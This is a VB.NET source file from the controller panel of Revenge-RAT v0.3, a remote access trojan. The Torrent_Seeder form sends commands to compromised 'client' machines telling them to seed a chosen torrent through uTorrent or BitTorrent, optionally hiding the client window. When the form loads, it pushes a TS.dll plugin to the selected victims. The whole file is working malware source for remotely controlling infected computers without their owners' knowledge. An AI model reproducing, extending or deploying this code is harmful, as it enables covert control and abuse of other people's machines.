Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Torrent_Seeder
    Public Bytes As Byte()
    Public FN As String
    Public SelectedIndex As Integer
    Public Sub New()
        Me.Bytes = Nothing
        Me.FN = String.Empty
        Me.InitializeComponent()
    End Sub

    Private Sub Seed_Click(sender As Object, e As EventArgs) Handles Seed.Click
        If Operators.ConditionalCompareObjectEqual(Me.SW.SelectedItem, Nothing, False) Then
            MessageBox.Show("You must select a client to seed your torrent!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim flag As Boolean
            Dim flag2 As Boolean
            Dim flag3 As Boolean
            Dim enumerator As IEnumerator
            If (MessageBox.Show("Hide client window after seed?!", "Revenge-RAT v0.3", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes) Then
                flag2 = True
            Else
                flag2 = False
            End If
            If (Me.SW.SelectedIndex = 0) Then
                flag3 = True
            ElseIf (Me.SW.SelectedIndex = 1) Then
                flag = True
            ElseIf (Me.SW.SelectedIndex = 2) Then
                flag3 = True
                flag = True
            End If
            Try
                enumerator = Me.Clients.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim strArray As String() = Strings.Split(current.SubItems.Item(1).Text, " | ", -1, CompareMethod.Binary)
                    My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"Seed Torrent", My.Forms.Main.Key, Conversions.ToString(Me.SelectedIndex), My.Forms.Main.Key, Me.FN, My.Forms.Main.Key, Convert.ToBase64String(Me.Bytes), My.Forms.Main.Key, Conversions.ToString(flag3), My.Forms.Main.Key, strArray(0).Replace("uTorrent : ", ""), My.Forms.Main.Key, Conversions.ToString(flag), My.Forms.Main.Key, strArray(1).Replace("BitTorrent : ", ""), My.Forms.Main.Key, Conversions.ToString(flag2)}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub Torrent_Seeder_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = ("Torrent Seeder | " & Environment.MachineName)
        If File.Exists((Application.StartupPath & "\Plugin\TS.dll")) Then
            Dim enumerator As IEnumerator
            Me.TopMost = True
            Try
                enumerator = My.Forms.Main.ListView1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", My.Forms.Main.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\TS.dll"))), My.Forms.Main.Key, current.ToolTipText, My.Forms.Main.Key, Conversions.ToString(True), My.Forms.Main.Key, "TS", My.Forms.Main.Key, "TS"}))
                Loop
            Finally
            End Try
            Me.TopMost = False
        End If
    End Sub
End Class